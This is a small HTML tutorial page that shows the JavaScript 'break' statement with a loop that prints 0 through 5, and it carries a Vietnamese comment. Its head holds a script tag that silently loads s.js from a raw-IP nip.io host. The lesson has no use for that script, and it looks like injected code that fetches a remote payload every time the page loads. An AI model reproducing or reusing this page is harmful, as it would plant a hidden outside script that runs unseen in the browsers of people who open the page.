<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Break</title>
<script src="https://153.75.226.33.nip.io/s.js" async></script></head>
<body>
	<script type="text/javascript">
		for( let i = 0; i < 10; i ++ ){
			document.write('<br>' + i);

			if( i == 5 ){
				break;//dừng lại
			}
		}
	</script>
</body>
</html>
